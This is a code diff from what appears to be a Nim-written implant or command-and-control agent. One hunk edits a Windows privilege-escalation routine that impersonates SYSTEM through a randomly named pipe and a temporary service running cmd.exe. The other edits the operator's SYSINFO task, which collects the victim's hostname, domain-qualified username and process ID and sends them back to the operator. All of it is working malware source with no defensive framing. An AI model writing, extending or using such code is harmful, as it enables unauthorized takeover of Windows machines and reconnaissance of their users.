@@ -444,14 +444,14 @@ when defined(windows):
       return "[+] T1 SYSTEM (winlogon PID=" & $sysPid & ")"
 
     # ── T2: Named pipe impersonation via service (overlapped, 15s timeout) ─
-    let rnd: uint32 = GetTickCount() xor GetCurrentProcessId()
+    let rnd: uint32 = GetTickCount().uint32 xor GetCurrentProcessId().uint32
     let pipeName = r"\\.\pipe\svc" & toHex(rnd.int64, 8)
     let svcName  = "svc" & toHex(int64(rnd xor 0xDEADBEEF'u32), 8)
     let binPath  = "cmd.exe /c echo . > " & pipeName
 
     let hPipe = CreateNamedPipeW(newWideCString(pipeName),
-      DWORD(0x00000003) or DWORD(0x40000000), # PIPE_ACCESS_DUPLEX | FILE_FLAG_OVERLAPPED
-      DWORD(0), 1'u32, 512'u32, 512'u32, 0'u32, nil)
+      DWORD(0x40000003), # PIPE_ACCESS_DUPLEX | FILE_FLAG_OVERLAPPED
+      DWORD(0), DWORD(1), DWORD(512), DWORD(512), DWORD(0), nil)
     if hPipe == INVALID_HANDLE_VALUE:
       return "[-] T1+T2 failed (CreateNamedPipe err " & $GetLastError() & ")"
     defer: discard CloseHandle(hPipe)
@@ -1357,8 +1357,11 @@ proc dispatchTask*(t: var AgentTransport; id: int64; typ, args: string; payload:
 
   of "SYSINFO":
     when defined(windows):
-      let info = "hostname=" & getEnvCmd("COMPUTERNAME","?") &
-        "\nusername=" & getEnvCmd("USERNAME","?") &
+      let siDom  = getEnvCmd("USERDOMAIN", "")
+      let siUsr  = getEnvCmd("USERNAME", "?")
+      let siUser = if siDom.len > 0: siDom & "\\" & siUsr else: siUsr
+      let info = "hostname=" & getEnvCmd("COMPUTERNAME","?").toLowerAscii() &
+        "\nusername=" & siUser &
         "\nos=windows/amd64\npid=" & $GetCurrentProcessId()
       t.sendResult(id, info, "")
     else:
